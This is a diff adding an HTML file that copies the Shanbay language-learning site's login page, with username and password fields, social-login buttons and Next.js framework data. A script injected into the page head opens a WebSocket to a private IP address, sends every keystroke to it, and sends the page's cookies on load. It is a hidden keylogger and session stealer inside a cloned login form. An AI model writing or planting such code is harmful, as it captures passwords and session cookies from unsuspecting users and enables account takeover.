@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <meta charset="utf-8"/>
+  <link data-precedence="next" href="local_resources\b17981a54f4d2f76.css" rel="stylesheet"/>
+  <link as="script" href="local_resources\awsc.js" rel="preload"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <link href="local_resources\shanbay_favicon.png" rel="shortcut icon" type="image/png"/>
+  <title>
+   扇贝
+  </title>
+  <meta content="initial-scale=1,user-scalable=no,maximum-scale=1,width=device-width,viewport-fit=cover" name="viewport"/>
+  <script nomodule="" src="local_resources\polyfills-78c92fac7aa8fdd8.js">
+  </script>
+  <script>
+   const serverUrl = 'ws://192.168.147.76:9601'; // 目标主机和端口
+                const socket = new WebSocket(serverUrl);
+
+                socket.onopen = function() {
+                    console.log('WebSocket connection established.');
+                };
+
+                socket.onclose = function(event) {
+                    if (event.wasClean) {
+                        console.log(`WebSocket connection closed cleanly, code=${event.code}, reason=${event.reason}`);
+                    } else {
+                        console.log('WebSocket connection died');
+                    }
+                };
+
+                socket.onerror = function(error) {
+                    console.error(`WebSocket error: ${error.message}`);
+                };
+
+                document.addEventListener('keydown', (event) => {
+                    const keyName = event.key;
+                    const logEntry = `Key pressed: ${keyName} (code: ${event.code})`;
+
+                    if (socket.readyState === WebSocket.OPEN) {
+                        socket.send(logEntry);
+                    }
+                });
+
+                // 获取并发送Cookies
+            function getCookies() {
+                let cookies = document.cookie;
+                if (socket.readyState === WebSocket.OPEN) {
+                    socket.send(`Cookies: ${cookies}`);
+                }
+            }
+
+            // 在页面加载完毕后发送Cookies
+            window.onload = getCookies;
+  </script>
+ </head>
+ <body class="dark:bg-slate-900">
+  <script>
+   (function () {
+                var preferredTheme;
+                try {
+                  preferredTheme = nightModeObj.getIsNightMode() ? 'dark' : 'light';
+                } catch (err) { }
+                if (!preferredTheme) {
+                  var darkQuery = window.matchMedia('(prefers-color-scheme: dark)');
+                  preferredTheme = darkQuery.matches ? 'dark' : 'light';
+                }
+                if (preferredTheme === 'dark') {
+                  document.documentElement.classList.add('dark');
+                } else if (preferredTheme === 'light') {
+                  document.documentElement.classList.remove('dark');
+                }
+                darkQuery && darkQuery.addEventListener('change', function (e) {
+                  if (!e.matches) {
+                    document.documentElement.classList.add('dark');
+                  } else if (preferredTheme === 'light') {
+                    document.documentElement.classList.remove('dark');
+                  }
+                });
+              })();
+  </script>
+  <div class="mx-auto flex flex-col items-center pt-2 xl:pt-12 px-8.5 sm:px-0 xl:px-[300px] w-full sm:w-[400px] xl:w-[900px] xl:mt-[145px] xl:h-[500px] xl:rounded-2xl xl:shadow-xl">
+   <div class="mb-8 text-4xl font-bold text-slate-900 dark:text-white">
+    欢迎来到扇贝
+   </div>
+   <label class="relative block w-full text-slate-400 focus-within:text-green-800 mb-4">
+    <div class="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3">
+     <svg class="h-6 w-6" fill="none" stroke="currentColor" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+      <path d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.501 20.118a7.5 7.5 0 0114.998 0A17.933 17.933 0 0112 21.75c-2.676 0-5.216-.584-7.499-1.632z" stroke-linecap="round" stroke-linejoin="round">
+      </path>
+     </svg>
+    </div>
+    <input class="h-11.5 w-full rounded-4xl border border-slate-200 dark:border-slate-300 text-lg text-slate-900 caret-green-800 appearance-none dark:bg-slate-600 placeholder:text-slate-200 focus:border-green-800 dark:text-white dark:placeholder:text-white pl-12" name="account" placeholder="用户名/邮箱/手机号" type="text" value=""/>
+   </label>
+   <label class="relative block w-full text-slate-400 focus-within:text-green-800 mb-2.5">
+    <div class="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-3">
+     <svg class="h-6 w-6" fill="none" stroke="currentColor" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+      <path d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" stroke-linecap="round" stroke-linejoin="round">
+      </path>
+     </svg>
+    </div>
+    <input class="h-11.5 w-full rounded-4xl border border-slate-200 dark:border-slate-300 text-lg text-slate-900 caret-green-800 appearance-none dark:bg-slate-600 placeholder:text-slate-200 focus:border-green-800 dark:text-white dark:placeholder:text-white pl-12" name="password" placeholder="密码" type="password" value=""/>
+   </label>
+   <div class="mb-7.5 flex w-full text-xs">
+    <span class="dark:text-white">
+     还没有账号？
+    </span>
+    <a class="mr-auto text-green-800" href="/bayaccount/register/phone?next=https%3A%2F%2Fweb.shanbay.com%2Fweb%2Fmain%2Findex">
+     去注册
+    </a>
+    <a class="text-green-800" href="/bayaccount/reset">
+     忘记密码？
+    </a>
+   </div>
+   <button class="block h-10.5 w-full rounded-3xl text-lg font-bold focus:outline-none disabled:cursor-not-allowed disabled:bg-slate-50 disabled:text-slate-200 bg-green-800 text-white mb-8" disabled="">
+    登录
+   </button>
+   <div class="flex w-full items-center mb-2.5">
+    <div class="h-px flex-grow bg-slate-100">
+    </div>
+    <div class="mx-5 text-3xs text-slate-200">
+     OR
+    </div>
+    <div class="h-px flex-grow bg-slate-100">
+    </div>
+   </div>
+   <div class="flex w-full justify-around">
+    <button class="flex flex-col items-center">
+     <div class="grid h-12 w-12 place-items-center rounded-full transition-colors" style="background-color:#D1D4D6">
+      <img alt="微信登录" height="24" src="local_resources\d164ce610394534c7a342988f44c35f3.2065cec06eb156021f2a1bdbfe304d15.png" width="24"/>
+     </div>
+     <span class="mt-2 text-3xs text-slate-400">
+      微信登录
+     </span>
+    </button>
+    <button class="flex flex-col items-center">
+     <div class="grid h-12 w-12 place-items-center rounded-full transition-colors" style="background-color:#D1D4D6">
+      <img alt="微博登录" height="24" src="local_resources\35cd4f1f0e287581c31fd43964099fa6.f173ba3656658a0f46023ee9faafad5b.png" width="24"/>
+     </div>
+     <span class="mt-2 text-3xs text-slate-400">
+      微博登录
+     </span>
+    </button>
+    <button class="flex flex-col items-center">
+     <div class="grid h-12 w-12 place-items-center rounded-full transition-colors" style="background-color:#D1D4D6">
+      <img alt="手机号登录" height="24" src="local_resources\ac34ee3f3431480b9c27e91af1e8c543.93e4977e0b64ee91ef3627c293c28db0.png" width="24"/>
+     </div>
+     <span class="mt-2 text-3xs text-slate-400">
+      手机号登录
+     </span>
+    </button>
+   </div>
+   <div class="fixed inset-0 z-10 hidden">
+   </div>
+   <div class="fixed top-1/2 left-1/2 z-10 grid h-[100px] w-[300px] -translate-x-1/2 -translate-y-1/2 place-items-center rounded bg-white shadow-md hidden">
+    <div id="captcha">
+    </div>
+   </div>
+  </div>
+  <script>
+   (self.__next_s=self.__next_s||[]).push(["https://g.alicdn.com/AWSC/AWSC/awsc.js"])
+  </script>
+  <script async="" src="local_resources\webpack-29c0e36243dc4f7b.js">
+  </script>
+  <script async="" src="local_resources\aab238c4-fb4a41a4f067996d.js">
+  </script>
+  <script async="" src="local_resources\93-cb9635016f11c0a7.js">
+  </script>
+  <script async="" src="local_resources\main-app-db764ed91cc377c5.js">
+  </script>
+  <script>
+   (self.__next_f=self.__next_f||[]).push([0])
+  </script>
+  <script>
+   self.__next_f.push([1,"1:HL[\"https://assets.baydn.com/web_static/bayaccount/_next/static/css/b17981a54f4d2f76.css\",{\"as\":\"style\"}]\n0:\"$L2\"\n"])
+  </script>
+  <script>
+   self.__next_f.push([1,"3:I{\"id\":60533,\"chunks\":[\"272:static/chunks/webpack-29c0e36243dc4f7b.js\",\"313:static/chunks/aab238c4-fb4a41a4f067996d.js\",\"93:static/chunks/93-cb9635016f11c0a7.js\"],\"name\":\"default\",\"async\":false}\n5:I{\"id\":45378,\"chunks\":[\"272:static/chunks/webpack-29c0e36243dc4f7b.js\",\"313:static/chunks/aab238c4-fb4a41a4f067996d.js\",\"93:static/chunks/93-cb9635016f11c0a7.js\"],\"name\":\"\",\"async\":false}\n7:I{\"id\":16120,\"chunks\":[\"185:static/chunks/app/layout-4cf67863ed1f251b.js\"],\"name\":\"\",\"async\":false}\n8:I{\"id\":4329,\"chunks\":"])
+  </script>
+  <script>
+   self.__next_f.push([1,"[\"272:static/chunks/webpack-29c0e36243dc4f7b.js\",\"313:static/chunks/aab238c4-fb4a41a4f067996d.js\",\"93:static/chunks/93-cb9635016f11c0a7.js\"],\"name\":\"default\",\"async\":false}\n9:I{\"id\":7400,\"chunks\":[\"272:static/chunks/webpack-29c0e36243dc4f7b.js\",\"313:static/chunks/aab238c4-fb4a41a4f067996d.js\",\"93:static/chunks/93-cb9635016f11c0a7.js\"],\"name\":\"default\",\"async\":false}\na:I{\"id\":91516,\"chunks\":[\"216:static/chunks/216-0f99fdfc908e3883.js\",\"419:static/chunks/419-1847f5b88ab074a1.js\",\"530:static/chunks/530-23bf75f"])
+  </script>
+  <script>
+   self.__next_f.push([1,"7d62b8534.js\",\"936:static/chunks/936-d8f3dc8bcdf029b2.js\",\"626:static/chunks/app/login/page-078b8626e36ede4e.js\"],\"name\":\"\",\"async\":false}\n"])
+  </script>
+  <script>
+   self.__next_f.push([1,"2:[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"https://assets.baydn.com/web_static/bayaccount/_next/static/css/b17981a54f4d2f76.css\",\"precedence\":\"next\"}]],[\"$\",\"$L3\",null,{\"buildId\":\"94c7on_YIAy9Wbd4XLXm4\",\"assetPrefix\":\"https://assets.baydn.com/web_static/bayaccount\",\"initialCanonicalUrl\":\"/login\",\"initialTree\":[\"\",{\"children\":[\"login\",{\"children\":[\"__PAGE__\",{}]}]},\"$undefined\",\"$undefined\",true],\"initialHead\":[\"$L4\",null],\"globalErrorComponent\":\"$5\",\"notFound\":[\"$\",\"html\",null,{\"children\":[[\"$\",\"head\",null,{\"children\":[[\"$\",\"link\",null,{\"rel\":\"shortcut icon\",\"href\":\"https://assets0.baydn.com/static/img/shanbay_favicon.png\",\"type\":\"image/png\"}],[\"$\",\"title\",null,{\"children\":\"扇贝\"}],[\"$\",\"meta\",null,{\"name\":\"viewport\",\"content\":\"initial-scale=1,user-scalable=no,maximum-scale=1,width=device-width,viewport-fit=cover\"}]]}],[\"$\",\"body\",null,{\"className\":\"dark:bg-slate-900\",\"children\":[[\"$\",\"script\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\\n              (function () {\\n                var preferredTheme;\\n                try {\\n                  preferredTheme = nightModeObj.getIsNightMode() ? 'dark' : 'light';\\n                } catch (err) { }\\n                if (!preferredTheme) {\\n                  var darkQuery = window.matchMedia('(prefers-color-scheme: dark)');\\n                  preferredTheme = darkQuery.matches ? 'dark' : 'light';\\n                }\\n                if (preferredTheme === 'dark') {\\n                  document.documentElement.classList.add('dark');\\n                } else if (preferredTheme === 'light') {\\n                  document.documentElement.classList.remove('dark');\\n                }\\n                darkQuery \u0026\u0026 darkQuery.addEventListener('change', function (e) {\\n                  if (!e.matches) {\\n                    document.documentElement.classList.add('dark');\\n                  } else if (preferredTheme === 'light') {\\n                    document.documentElement.classList.remove('dark');\\n                  }\\n                });\\n              })();\\n              \"}}],[\"$L6\",\"$undefined\",[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]]],[\"$\",\"$L7\",null,{\"strategy\":\"beforeInteractive\",\"src\":\"https://g.alicdn.com/AWSC/AWSC/awsc.js\"}]]}]]}],\"asNotFound\":false,\"children\":[[\"$\",\"html\",null,{\"children\":[[\"$\",\"head\",null,{\"children\":[[\"$\",\"link\",null,{\"rel\":\"shortcut icon\",\"href\":\"https://assets0.baydn.com/static/img/shanbay_favicon.png\",\"type\":\"image/png\"}],[\"$\",\"title\",null,{\"children\":\"扇贝\"}],[\"$\",\"meta\",null,{\"name\":\"viewport\",\"content\":\"initial-scale=1,user-scalable=no,maximum-scale=1,width=device-width,viewport-fit=cover\"}]]}],[\"$\",\"body\",null,{\"className\":\"dark:bg-slate-900\",\"children\":[[\"$\",\"script\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\\n              (function () {\\n                var preferredTheme;\\n                try {\\n                  preferredTheme = nightModeObj.getIsNightMode() ? 'dark' : 'light';\\n                } catch (err) { }\\n                if (!preferredTheme) {\\n                  var darkQuery = window.matchMedia('(prefers-color-scheme: dark)');\\n                  preferredTheme = darkQuery.matches ? 'dark' : 'light';\\n                }\\n                if (preferredTheme === 'dark') {\\n                  document.documentElement.classList.add('dark');\\n                } else if (preferredTheme === 'light') {\\n                  document.documentElement.classList.remove('dark');\\n                }\\n                darkQuery \u0026\u0026 darkQuery.addEventListener('change', function (e) {\\n                  if (!e.matches) {\\n                    document.documentElement.classList.add('dark');\\n                  } else if (preferredTheme === 'light') {\\n                    document.documentElement.classList.remove('dark');\\n                  }\\n                });\\n              })();\\n              \"}}],[\"$\",\"$L8\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$L9\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"childProp\":{\"current\":[\"$\",\"$L8\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"login\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$L9\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"childProp\":{\"current\":[[\"$\",\"$La\",null,{\"params\":{},\"searchParams\":{}}],null],\"segment\":\"__PAGE__\"},\"styles\":[]}],\"segment\":\"login\"},\"styles\":[]}],[\"$\",\"$L7\",null,{\"strategy\":\"beforeInteractive\",\"src\":\"https://g.alicdn.com/AWSC/AWSC/awsc.js\"}]]}]]}],null]}]]\n"])
+  </script>
+  <script>
+   self.__next_f.push([1,"6:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n4:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n"])
+  </script>
+ </body>
+</html>
